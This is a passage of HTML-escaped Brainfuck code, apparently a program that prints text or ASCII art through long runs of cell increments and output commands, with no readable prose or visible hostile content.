lt;..+++++.-----..........+.&gt;&gt;&gt;------.+++++++.&lt;&lt;&lt;+++++++.--------..&gt;&gt;+++.&gt;-----.&lt;&lt;.&lt;.&gt;+.&gt;&gt;&gt;-------.&lt;&lt;&lt;-----.&lt;+.&gt;&gt;&gt;&gt;++++.&lt;++.&lt;&lt;++++.&lt;-.&gt;.&gt;&gt;------.&lt;&lt;.&lt;+++++.-----....+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-...+.+++++++.&lt;---------.&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;..&gt;++.&gt;&gt;&gt;+.&lt;&lt;&lt;----------..............+++++.-----..........+.&gt;&gt;&gt;--.+++++++.&lt;&lt;&lt;+++++++.--------..&gt;&gt;.&gt;-----.&lt;&lt;.&lt;.&gt;+.&gt;&gt;&gt;----.&lt;&lt;&lt;-----.&lt;+.&gt;&gt;&gt;&gt;++++.&lt;++.&lt;&lt;++++.&lt;-.&gt;.&lt;..&gt;-------.&lt;....+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-...+++.&gt;-.&lt;&lt;.&gt;&gt;+++++++.&lt;&lt;..&gt;&gt;+.&lt;---......&gt;--.&lt;++++..&gt;&gt;+.&lt;.&lt;++.--.&gt;&gt;&gt;++++++.&lt;&lt;+.&lt;--.&lt;++++.&gt;&gt;&gt;++++++++++.&lt;&lt;++++++.&gt;&gt;++++.&lt;&lt;--------..&lt;----.&gt;++++++.&gt;&gt;+++.&gt;++++.--.&lt;&lt;---.&gt;&gt;&gt;++.&lt;&lt;&lt;++++.&gt;-.&lt;&lt;------.....+.&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;-...+.+++.----....&lt;++++++.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;--.----..+++.&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;.....&gt;..&lt;&lt;++.&gt;&gt;.&gt;-.-.&lt;-------.&lt;+++..&gt;+++++++.++++++++.&lt;-.&gt;+.&gt;.&gt;&gt;+.&lt;&lt;&lt;&lt;+++++.-----.--...&gt;--------.&lt;....++++++.&gt;-.&lt;------...+.-.&lt;-----.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;..&gt;&gt;+++++++++.---------.&lt;....+.+.+.&gt;&gt;+.&lt;&lt;-.&gt;-.&lt;--.&gt;&gt;+++.&lt;-------.++++++.&lt;++++++.++.&lt;+++++.&gt;-----.&gt;+++.-.&lt;&lt;.&gt;&gt;&gt;----.+++.&lt;.+.&lt;-.+.&gt;&gt;-..&lt;-----.&lt;--.&gt;++++++++.&gt;--.&lt;------.--.----.&gt;--------------.&lt;--.&gt;------.&lt;&lt;-.&lt;..&gt;&gt;&gt;&gt;------------.&gt;+.&lt;---.&lt;-----.&lt;&lt;+++.&gt;&gt;&gt;+++++++.&lt;&lt;&lt;--.&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;++.&gt;&gt;&gt;-.--.&lt;&lt;&lt;--.++.&gt;&gt;&gt;++.&lt;&lt;&lt;--..++.&gt;&gt;&gt;-.-.&lt;&lt;&lt;-.+.&gt;&gt;&gt;+.&lt;&lt;&lt;--.+.+.&gt;&gt;&gt;-..&lt;&lt;&lt;-.+.&gt;&gt;&gt;.&lt;&lt;&lt;--.+.+.&gt;&gt;&gt;-..&lt;&lt;&lt;---.&gt;-.&lt;....&gt;&gt;---.&gt;&gt;--.&lt;&lt;&lt;&lt;...+.&gt;&gt;&gt;++++++++.&lt;&lt;&lt;&lt;-----.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;..&gt;-.&gt;&gt;&gt;--------.&lt;&lt;&ltgt;&gt;++++++.&lt;&lt;.&gt;&gt;+++++.&lt;&lt;........&gt;&gt;&gt;.&lt;&lt;&lt;+.&gt;&gt;-.&lt;&lt;-...................&gt;&gt;----.&lt;&lt;.........+.-..........&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;...........&gt;&gt;+.&lt;&lt;........&gt;&gt;----.&lt;&lt;.........&gt;.&gt;+++.&lt;+.&gt;.&lt;&lt;.......&gt;.&gt;.&lt;&lt;.........&gt;&gt;.&lt;&lt;+++.&gt;&gt;&gt;++++++.&lt;&lt;&lt;---.......+.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;-.........++.--..........&gt;&gt;&gt;------------.&lt;&lt;&lt;.........+.&gt;&gt;&gt;++++++.&lt;--.++++++++++.&lt;&lt;-.......&gt;+.&lt;..........&gt;+.&lt;.........&gt;+++++++.&gt;-.&lt;&lt;&lt;----.++++.+++.++++++.&gt;.....&gt;&gt;&gt;++++++.&lt;&lt;&lt;.&gt;------.&lt;........&gt;----.&lt;.........&gt;--.&lt;.&gt;.&gt;-------.&lt;&lt;.......+.&gt;&gt;&gt;------.&lt;&lt;&lt;-........&gt;-.&lt;&lt;----.&gt;.&gt;&gt;&gt;++++.&lt;&lt;&lt;........&gt;&gt;&gt;++++.&lt;&lt;&lt;.........&gt;&gt;.&gt;&gt;++++.&lt;&lt;&lt;&lt;.........&gt;&gt;-----.&lt;&lt;.........+.&gt;&gt;&gt;--------.&lt;&lt;&lt;-.........&gt;+++.&gt;+++++.&lt;&lt;....................&gt;&gt;----.&lt;&lt;..........+..&gt;&gt;&gt;.&lt;&lt;&lt;-.......++.--.........&gt;-.&gt;&gt;.&lt;&lt;&lt;.........&gt;+.&lt;..........&gt;++.&lt;.........+.&gt;&gt;&gt;----.&lt;&lt;&lt;-.........&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;&gt;+.&lt;&lt;........&gt;.&lt;.........&gt;+++.&lt;.+++.&gt;&gt;+++.&lt;&lt;---.......++.--..........&gt;&gt;++++++++.&lt;&lt;..........&gt;&gt;&gt;++++++++.&lt;&lt;&lt;.........&gt;----.&lt;.........+++.&lt;---------.++++..++++++++++.&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;---.....&gt;++.&lt;.+++.&gt;++++++++.&lt;---.......&lt;----------....&gt;&gt;&gt;+++++++++.&gt;&gt;+.&lt;&lt;&lt;&lt;.....+.-.........&gt;-.&lt;+++.&lt;..+++.++++++.&gt;---.....&gt;&gt;++.&lt;&lt;.&gt;--.&lt;..................................................................................................................................................++.&gt;&gt;+++.&lt;+.++++++++++.&lt;--............................+++.&gt;.&lt;+.&gt;--------.&lt;----.......&gt;+.&gt;.&lt;.&lt;.......+.&gt;+++++.&lt;.+++.----.......................................................................++++++.&gt;&gt;&gt;+.&gt;+++.&lt;&lt;&lt;&lt;++.-.&gt;-----.&gt;&gt;+++.&lt;&lt;++++++++.--.&lt;++.&gt;&gt;&gt;---.&lt;&lt;&lt;-.--.-.&gt;&gt;&gt;&gt;-----.&lt;&lt;--.&lt;.------.&gt;&gt;+++.&lt;----.&lt;+++++.&lt;&lt;---.&gt;&gt;&gt;&gt;-.&lt;&lt;-------.&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;-----..&lt;.&gt;&gt;----.&gt;&gt;-.&lt;+++++.&lt;&lt;.&gt;+++.&gt;+++.&gt;&gt;--..&lt;&lt;&lt;&lt;.+++.&gt;&gt;++.&gt;&gt;+.&lt;&lt;----------.&lt;&lt;---..&lt;+.&gt;&gt;----.&lt;&lt;&lt;+++++++++++.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;.&gt;++++.++++.&lt;&lt;.&gt;&gt;&gt;&gt;----.-.&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;-------.+.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;------.&lt;---.&lt;-.&gt;&gt;-.&gt;&gt;++.&lt;&lt;&lt;..&gt;+++.++++.&lt;&lt;-.&gt;&gt;&gt;&gt;.&gt;+++++++.&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;++++++.&lt;++++++.&lt;&lt;+++++.----.----.&lt;+.&gt;&gt;&gt;&gt;+++.&lt;------.&gt;--.&lt;&lt;&lt;.&gt;----.&gt;&gt;---.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;.+++.&gt;&gt;&gt;+++.---.+++.&lt;&lt;&lt;---..&lt;.&gt;&gt;&gt;--------.++++++++.-------.&lt;&lt;........&gt;+++.&lt;&lt;&lt;+++++.&gt;&gt;&gt;----.&lt;+++.&gt;+.&gt;&gt;-------.&lt;&lt;&lt;---.&gt;&gt;&gt;++++++.&lt;----.+.&lt;-----.&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;+++++++++++.&gt;-.&lt;&lt;++++++++.&lt;&lt;&lt;.&gt;&gt;++++++++.-----.&gt;+++.&gt;&gt;&gt;-.&lt;&lt;&lt;-------.&lt;-.&lt;-.&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;--.++++++++.++++++.&lt;&lt;&lt;.&gt;&gt;&gt;-.&gt;&gt;.&lt;&lt;---.&gt;&gt;&gt;--.&lt;&lt;++.&lt;&lt;+++++.&gt;-.&gt;&gt;&gt;+++.&lt;&lt;++.++++.&lt;&lt;---.&lt;&lt;+.&gt;&gt;+++++++.&gt;&gt;.&lt;&lt;-----------.&lt;&lt;--.&gt;&gt;&gt;---------.&gt;.&lt;&lt;++++.&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;-.++++++++.&lt;----.&lt;&lt;+.&gt;&gt;&gt;-------.&gt;.&lt;+++++.&gt;&gt;&gt;--.&lt;&lt;&lt;----.&lt;++.--.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;.&lt;+++.+.&lt;&lt;+.&gt;&gt;&gt;.&lt;-.&gt;++++++++++++.&gt;&gt;&gt;--.&lt;&lt;&lt;----------.++.&lt;---...............................................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.+.-.+++.&gt;&gt;---.&lt;&lt;-.&gt;.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.++.--.+++++.&gt;.&lt;---.&gt;.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.+++.---.+++++++.&gt;.&lt;-----.&gt;.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.++++.----.&gt;-------.&gt;.&lt;&lt;++.&gt;+++++++.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.+++++.-----.&gt;-----.&gt;.&lt;&lt;++.&gt;+++++.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.++++++.------.+++.---.+++.&gt;.&lt;---........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.+++++++.-------.+++++++.&gt;.&lt;----.&gt;.&lt;---........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.++++++++.--------.++++++++.--------.+++.&gt;.&lt;---........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;-------.&lt;.&gt;+.&lt;.+++.&gt;++++++.&lt;---........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;------.&lt;.&gt;+.&gt;.&lt;&lt;+++.&gt;+++++.&lt;---........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;-----.&lt;...++++.&gt;+++++.&lt;----........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;----.&lt;.++.--.++++.&gt;++++.&lt;----........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;---.&lt;.++++++.------.++++.&gt;+++.&lt;----........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;--.&lt;.+++++++.-------.++++.&gt;++.&lt;----........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;-.&lt;.+++++.&gt;+.&lt;+.&gt;.&lt;------........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;.&lt;.++++++.------.++++++.&gt;.&lt;------........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;+.&lt;.&gt;----.+++.&lt;++++++.&gt;.&lt;------........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;++.&lt;..&gt;&gt;.&lt;&lt;+++++++.&gt;--.&lt;-------........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;+++.&lt;.+.-.&gt;-----.++++++++++.&lt;........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;----.&lt;.+.&gt;&gt;.&lt;------.++++++++++.&lt;-........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;---.&lt;.++.--.&gt;-------.++++++++++.&lt;........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;--.&lt;.++.&gt;&gt;.&lt;--------.++++++++++.&lt;--........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;-.&lt;.&gt;--------.&gt;.&lt;.+++++++++.&lt;........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;.&lt;...&gt;--------.++++++++.&lt;........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;+.&lt;.++++.----.&gt;---------.++++++++.&lt;........................&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;.&gt;&gt;------.&lt;&lt;.++++++++++.&lt;&lt;--.&gt;&gt;++++++.&gt;.&lt;&lt;+++++++++++++........................&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;+.&lt;&lt;&lt;.......................+.-....+.-.+++.&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;---.....................&gt;----.&lt;.....&gt;++++.&lt;.&gt;&gt;---.&lt;&lt;.++.--.&gt;--.&gt;+++.&lt;&lt;..................&gt;&gt;+.&lt;&lt;.....&gt;&gt;&gt;+++++.&lt;&lt;&lt;.&gt;.&lt;.&gt;----.&lt;.++++.&gt;++++++.&lt;----..................&gt;&gt;&gt;-----.&lt;&lt;&lt;.....&gt;&gt;&gt;+++++.&lt;&lt;&lt;.&gt;--.&lt;.&gt;.&lt;.++++.&gt;++.&lt;----..................&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;.....&gt;&gt;&gt;.&lt;&lt;&lt;.&gt;--.&lt;.++.--.+++++.&gt;++.&lt;-----.................+.+++.----.....&gt;.&lt;.&gt;&gt;&gt;------.&lt;&lt;&lt;.&gt;------.&lt;&lt;+.&gt;&gt;++++++.&gt;-.&lt;&lt;........&gt;.&lt;........+.&gt;+++.&lt;-.....&gt;---.&lt;.&gt;++++.&lt;.+.&gt;&gt;&gt;++++++.&lt;&lt;------.&gt;.&lt;&lt;-.................+.&lt;++++++.&gt;-.....&gt;&gt;&gt;.&lt;&lt;&lt;.&gt;.&lt;.++++.----.+++++.&gt;++.&lt;-----.................++.++++.------.....&gt;.&lt;.&gt;+++.&lt;.+.-.&gt;-----.&gt;.&lt;&lt;.................++.&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;--....+.-.+++.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;&lt;-------.&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;---....................++.&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;&lt;--.....&gt;++.&lt;.&gt;&gt;+.&lt;&lt;.++++++.------.&gt;.&gt;-.&lt;&lt;.......&gt;+++.---.&lt;.........+.-....+.-.+++.&gt;&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;---....................++.&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;--.....&gt;.&lt;.&gt;++.&lt;.&gt;---.&gt;&gt;.&lt;&lt;&lt;+++++++.&gt;+.&lt;-------.................+++.---......&gt;.&lt;.&gt;&gt;---.&lt;&lt;.++.--.&gt;--.&gt;+++.&lt;&lt;.......................+.-.+++.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;---....................+++.&gt;--.&lt;---.......&gt;&gt;-----.&lt;&lt;.+.&gt;&gt;&gt;.&lt;&lt;++.&gt;+++++.&lt;&lt;-.................+++.&gt;&gt;&gt;---.&lt;&lt;&lt;---.....&gt;++.&lt;.&gt;&gt;--.&lt;&lt;.++.&gt;&gt;&gt;+++.&lt;&lt;--.&gt;++.&lt;&lt;--.................+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;---.......&gt;+++++.&lt;.+.-.&gt;-----.&gt;.&lt;&lt;.................+++.&lt;++++++.&gt;---.......&gt;+++.&lt;.&gt;----.+++.&lt;++++++.&gt;.&lt;------..................&gt;----.&lt;.&gt;++++.&lt;...&gt;.&lt;.&gt;&gt;.&lt;&lt;...&gt;.&gt;.&lt;&lt;..................&gt;&gt;&gt;++.&lt;&lt;&lt;.&gt;.&lt;..++++.&gt;&gt;&gt;--.&lt;&lt;&lt;----.&gt;--.&lt;.+++++.-----.++++++.&gt;++.&lt;------........&gt;&gt;&gt;.&lt;&lt;&lt;.........&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;.&gt;.&lt;..++++++++.--------.........................++.++++++.--------.&gt;.&lt;..++++++++.--------..&gt;&gt;+.&lt;&lt;.++++.----.&gt;.&gt;-.&lt;&lt;.................+.&gt;--.&lt;-.&gt;++.&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----........................+.&gt;&gt;&gt;.&lt;&lt;&lt;-.&gt;.&lt;..++++.----..&gt;&gt;+.&lt;&lt;.&gt;------.&lt;&lt;-----.&gt;&gt;++++++.&gt;-.&lt;&lt;..................&gt;&gt;&gt;&gt;++++++.&lt;&lt;&lt;&lt;.&gt;.&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----.&gt;-.&lt;.+++++.&gt;+.&lt;+.&gt;.&lt;------.................+.&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;&lt;-.&gt;.&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----........................++.++++.------.&gt;.&lt;..++++.----..&gt;&gt;+.&lt;&lt;.++++.----.&gt;.&gt;-.&lt;&lt;.................++.&gt;+++.&lt;--.&gt;---.&lt;..++++++++.--------.........................++.&gt;&gt;&gt;++.&lt;&lt;&lt;--.&gt;.&lt;..++++.&gt;.&lt;++++.&gt;&gt;+.&lt;&lt;--------.++++.&gt;&gt;&gt;--.&lt;&lt;.&gt;-.&lt;&lt;----.................++.&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;&lt;&lt;--.&gt;.&lt;..++++.&gt;.&lt;----.&gt;.&lt;.++++++.------.++++++.&gt;.&lt;------.......+.-.........++.&lt;-----.&gt;--.&gt;.&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----.&gt;--.&lt;.&gt;.&lt;.+++++.&gt;++.&lt;-----.......&gt;&gt;+.&lt;.&lt;........+++.&gt;&gt;-.&lt;&lt;---....++++.----..&gt;&gt;&gt;------.&lt;&lt;&lt;.&gt;-----.&lt;.&gt;+++++.&gt;.&lt;&lt;.................++.&gt;----.&lt;--.&gt;++++.&lt;..++++.&gt;&gt;&gt;++++++.&lt;&lt;&lt;----.&gt;--.&lt;.+++++++.-------.++++.&gt;++.&lt;----.......&gt;------.&gt;&gt;.&lt;&lt;&lt;........+++.&gt;++++.&lt;---.&gt;++.&lt;..++++.----..&gt;&gt;&gt;------.&lt;&lt;&lt;.&gt;------.&lt;&lt;+++++.&gt;&gt;++++++.&gt;.&lt;&lt;.................+++.&gt;&gt;&gt;.&lt;&lt;&lt;---.&gt;.&lt;..++++.&gt;&gt;&gt;++++++.&lt;&lt;&lt;----.&gt;--.&lt;.++++++.&gt;&gt;.&lt;&lt;-.&gt;++.&lt;-----.......&gt;&gt;&gt;------.&gt;&gt;+.&lt;&lt;&lt;&lt;&lt;........+++.&gt;&gt;&gt;+++++.&lt;&lt;&lt;---.&gt;.&lt;..++++++++.--------.........................+++.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;---.&gt;.&lt;..++++.&gt;.&lt;++++.&gt;&gt;+.&lt;&lt;--------.&gt;-----.&lt;.&gt;+++++.&gt;-.&lt;&lt;.................+++.&lt;-.&gt;---.&gt;.&lt;..++++++++.--------..........................&gt;&gt;+.&lt;&lt;.&gt;&gt;&gt;+.&lt;&lt;&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----........................+++.+++++.--------.&gt;.&lt;..++++.&gt;&gt;&gt;.&lt;&lt;&lt;----.&gt;-----.&lt;...++++.&gt;+++++.&lt;----...................&gt;&gt;-.&lt;&lt;&lt;++++.&gt;&gt;-------.&lt;&lt;---.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;-------.&lt;&lt;&lt;--.&gt;&gt;&gt;++++++++.&gt;&gt;-.&lt;&lt;-.&gt;&gt;&gt;-----.&lt;&lt;&lt;.&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;+.&gt;&gt;&gt;+++.&lt;-.&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;++.&gt;&gt;---.&gt;&gt;----.&lt;&lt;&lt;&lt;&lt;+++++++++.&gt;&gt;+++.&gt;--.+++.&lt;+.&gt;-.+++.&lt;&lt;&lt;--------.+++++++.&gt;---.&gt;&gt;++.&lt;&lt;++++++.&gt;&gt;----.&gt;&gt;&gt;++.&lt;&lt;&lt;++++.---.&gt;--.&gt;++++.&lt;-.&lt;&lt;&lt;&lt;-----.&gt;&gt;++++.&gt;&gt;&gt;----.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;++++++.---------.&gt;&gt;&gt;&gt;-.&lt;-.&lt;&lt;&lt;+++++++++.&gt;&gt;&gt;&gt;&gt;--.&lt;.&lt;&lt;&lt;.&lt;.&gt;&gt;&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;++++.--.&lt;-----.&lt;------.&gt;&gt;.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;+.&lt;.&lt;&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;+++.&lt;.&lt;&lt;&lt;++++++.&lt;.&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;+.--.&gt;&gt;&gt;+++.&lt;---.&lt;&lt;+++.&lt;&lt;+.&gt;+++++.&gt;&gt;&gt;&gt;--.&lt;&lt;+.&gt;++++++++.&lt;&lt;&lt;----.&gt;&gt;+++.&lt;-.-.--.&lt;&lt;&lt;-----.&gt;-------.++++++.&gt;.&gt;&gt;&gt;&gt;.&lt;&lt;----.&lt;++.&lt;&lt;-----.&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;++.--.&lt;++++.&gt;&gt;&gt;--.&lt;&lt;++.&lt;&lt;+.&lt;.-.&gt;&gt;----.++++++.&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;---.&gt;--.+++++.&lt;+++++++++.&gt;&gt;&gt;&gt;++++.&lt;.&lt;&lt;+.&lt;.&gt;&gt;&gt;&gt;.&lt;.&lt;&lt;&lt;-------.&gt;&gt;&gt;&gt;&gt;&gt;+++++.--.&lt;&lt;&lt;-.&gt;&gt;++.&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;&gt;---.&lt;&lt;&lt;-.&lt;&lt;&lt;.&gt;&gt;--.&lt;&lt;--.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;&lt;+++.&gt;++++.&gt;&gt;&gt;&gt;&gt;+++++++.&lt;&lt;&lt;.&lt;&lt;&lt;-.&gt;----.&lt;-.&gt;&gt;&gt;&gt;+++.&lt;&lt;&lt;.&lt;++++++++.&gt;&gt;&gt;&gt;&gt;.&lt;----.&lt;-.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;+++.&lt;&lt;+.&lt;&lt;&lt;---.&gt;.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;++.&gt;---.&lt;&lt;&lt;&lt;.&lt;+++.&gt;&gt;&gt;.&lt;&lt;&lt;---.&gt;&gt;&gt;--.&gt;&gt;&gt;----.&lt;&lt;+.&lt;&lt;&lt;++.++.&lt;+++.&gt;---------.++++++.&gt;&gt;++++.&gt;&gt;&gt;++++.&lt;&lt;&lt;-.--.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;+.&lt;&lt;&lt;+.&gt;&gt;.&lt;&lt;-.&gt;&gt;&gt;&gt;--.&lt;-.&lt;&lt;&lt;.++++.&gt;------.+++++.&lt;++++.&gt;&gt;&gt;&gt;++++.&lt;+++.&gt;&gt;++.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;++.------.&lt;---.-.&gt;++++.&lt;++++.&lt;&lt;--.&gt;++++.&gt;&gt;&gt;&gt;-----.&lt;&lt;----.&lt;&lt;++.&gt;&gt;&gt;--.&lt;++++.-----.&lt;&lt;-.&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;++++.&lt;+++.&lt;&lt;&lt;--.&lt;++++.&gt;&gt;&gt;&gt;++++.-----.&gt;--.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;+++++.---.&lt;&lt;-.&lt;&lt;.&gt;&gt;&gt;&gt;&gt;--.&lt;---.&gt;++.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;+++++.&lt;&lt;+++.&lt;&lt;-.&lt;--------.&lt;---------.&gt;&gt;&gt;.--.&lt;---.&lt;&lt;.&gt;&gt;--.&gt;&gt;&gt;-.&lt;&lt;&lt;+.&lt;-.&gt;&gt;&gt;---.&lt;-.&lt;&lt;+++++.&gt;&gt;&gt;&gt;+.&lt;-.&lt;.&lt;.&lt;-----.&gt;&gt;+.&lt;&lt;&lt;+.++++++++.&gt;++++++.&gt;&gt;---.&gt;&gt;---.&lt;&lt;&lt;&lt;-.&gt;+.&gt;---.++++.&lt;&lt;&lt;.&gt;.&gt;&gt;--.&gt;&gt;.&lt;&lt;--.&gt;+++++.&lt;++++++.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;----.&gt;&gt;&gt;.&lt;.&lt;&lt;&lt;---------.&gt;&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;++.&gt;&gt;---.&gt;&gt;----.&lt;&lt;&lt;&lt;&lt;+++++++++.&gt;++.&gt;&gt;-.&gt;&gt;-.&lt;&lt;--.&gt;.&lt;++++++.&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;----.&gt;&gt;&gt;.&lt;.&lt;&lt;&lt;-------.&gt;&gt;&gt;&gt;&gt;+.&gt;--.&lt;&lt;-----.&lt;.&lt;++++.&gt;&gt;+++++.&lt;+.-.&lt;&lt;++++++++.&gt;&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;+.-.&gt;&gt;.&lt;.&lt;++.---.&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;---------.+++++.&lt;++++.&gt;-.&gt;&gt;.--.&lt;&lt;&lt;----.&gt;---.&gt;&gt;-.+.&gt;&gt;+.&lt;&lt;&lt;&lt;++.---.+++++.&lt;++++.&gt;&gt;&gt;&gt;.-----.&lt;++.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;++++.&lt;+++.&lt;&lt;&lt;.&lt;++++.&gt;&gt;&gt;&gt;++++.-----.&gt;--.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;+++++.---.&lt;-.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;-.&lt;&lt;&lt;---.-.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;.&lt;&lt;&lt;-----.+.&gt;&gt;&gt;++.&lt;++.&lt;&lt;&lt;---------.&gt;&gt;&gt;&gt;--.&lt;&lt;---.&gt;--..&lt;&lt;&lt;+++++++++.&gt;++++.&gt;&gt;---.&lt;&lt;.&lt;.&gt;+.&gt;&gt;++.&gt;&gt;---.&lt;&lt;&lt;&lt;-.&gt;-.&gt;---.++++.&lt;&lt;&lt;.&gt;+++.&gt;++++.&lt;---.+++.&lt;++++++++.&gt;&gt;&gt;++.&lt;&lt;&lt;-----------------.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;++++.&gt;++.&lt;&lt;.&gt;---.--------.&gt;.&lt;++++.&lt;+++++++++.&gt;&gt;----.++.&gt;&gt;&gt;.&lt;&lt;++.&lt;++.--.++++.----.&gt;&gt;++.&lt;&lt;++++.&lt;-.+.---.&gt;--.&lt;++.&gt;++.&gt;&gt;.&lt;&lt;&lt;----.+++++.&lt;.&gt;&gt;&gt;&gt;.----.&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;+.---.&lt;&lt;-.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;+.&lt;+.&lt;&lt;&lt;&lt;------.&gt;&gt;.&gt;&gt;+++.&lt;+.&gt;&gt;+++.-.&gt;----.&lt;&lt;-----.&lt;&lt;-----.&lt;-----.&gt;&gt;&gt;+++++.&lt;&lt;++.+++.----.----.&gt;--.&lt;&lt;&lt;-.&gt;&gt;++++.&gt;&gt;&gt;.&lt;---.&gt;+.&lt;&lt;--.&gt;&gt;+.&lt;--.&lt